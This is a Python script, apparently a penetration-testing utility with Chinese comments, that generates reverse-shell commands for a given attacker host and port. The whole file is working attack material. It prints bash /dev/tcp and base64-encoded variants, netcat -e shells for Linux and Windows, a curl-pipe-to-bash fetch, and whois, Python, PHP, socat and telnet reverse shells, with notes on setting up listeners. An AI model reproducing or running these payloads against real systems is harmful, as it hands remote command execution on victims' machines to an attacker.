
# -*- coding: utf-8 -*-
# @Time    : 2021/3/8
# @Author  : Coco
# @FileName: Create_bounce_shell.py

import re
import base64
import argparse
import sys
import time

def create_payload(host,port):
    # print(port+1)
    shell  = "bash -i >& /dev/tcp/{}/{} 0>&1".format(host,port)
    basehost = base64.b64encode(shell.encode())
    #  base64 shell 
    # baseshell =  "bash -c"+ "{echo,%s}|{base64,-d}|{bash,-i}"%basehost.decode()
    baseshell = 'echo %s|{base64,-d}|{bash,-i}'%basehost.decode()
    # nc shell  反向shell
    ncshell = "nc -e /bin/bash {} {}".format(host,port)
    # curl反弹  Kali开启apache服务，把bash命令写入html文件，只要文本包含bash一句话即可。
    curlshell = "curl %s/bash.html|bash"%host
    #  whois 反弹shell只能执行后面的命令  需要先监听本地端口才能执行命令
    whoishell = "whois -h {} -p {} `pwd`".format(host,port)
    # python shell
    pythonshell = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""".format(host,port)
    # php shell 
    phpshell = """php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'""".format(host,port)
    # socat 反弹
    socatshell =  "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{}:{}".format(host,port)
    # windows 下反弹shell 
    nc_cmd_shell = 'nc {} {} -e c:\windows\system32\cmd.exe'.format(host,port)
    # print("\033[32m30mSuixinBlog: https://.cn\033[0m")
    # telnet反弹
    i = int(port+1) 
    telnet_shell = 'telnet {} {} | /bin/bash | telnet {} {}'.format(host,port,host,port+1)
    files = {
    "[*] baseshell: "+shell+'\n'+'\n'
    "[*] base64_shell: "+baseshell+'\n'
    "通过payload base64编码反弹shell"+'\n'+'\n'
    "[*] curlshell: "+curlshell+'\n'
    "服务器开启apache服务，把bash命令写入html文件，只要文本包含bash一句话即可。"+'\n'+'\n'
    "[*] ncshell: "+ncshell+'\n'
    "-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(/bin/bash)，也就是反弹一个shell给远程，可以看到远程已经成功反弹到了shell，并且可以执行命令"+'\n'+'\n'
    "[*] whoishell: "+ whoishell+'\n'
    "whois -h 127.0.0.1 -p 4444 `pwd` //反弹的shell只能执行后面带的命令"+'\n'+'\n'
    "[*] pythonshell: "+pythonshell+'\n'
    "通过python反弹shell"+'\n'+'\n'
    "[*] phpshell: "+phpshell+'\n'
    "跟python同理，通过php执行shell"+'\n'+'\n'
    "[*] socatshell: "+socatshell+'\n'
    "socat TCP-LISTEN:12345 EXEC:/bin/bash"+'\n'+'\n'
    "[*] nc_cmd_shell: "+nc_cmd_shell+'\n'
    "服务端反弹：nc 192.168.2.103 4444 -e c:\windows\system32\cmd.exe"+'\n'+'\n'
    "[*] telnet_shell: "+telnet_shell+'\n'
    "备注：需要在攻击主机上分别监听1234和4321端口，执行反弹shell命令后，在1234终端输入命令，4321查看命令执行后的结果"+'\n'+'\n'
    }
    for  i in files:
        print("\033[32m"+str(i)+'\033[0m')
if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog='Create_bounce_shell.py!',
                                     description='python3 Create_bounce_shell.py -s [host] -p [port]',
                                     epilog='python3 Create_bounce_shell.py -s 127.0.0.1 -p 8080')
    parser.add_argument('-s', '--host', type=str, help='自己IP，如果是VPS请输入公网IP')
    parser.add_argument('-p', '--port', type=str, help='自己的端口')
    args = parser.parse_args()
    try:
        host = args.host
        port = args.port
    except:
        print ('参数输入错误，请输入python3 Create_bounce_shell.py -h查看使用帮助')
        sys.exit(0)
    create_payload(host,int(port))
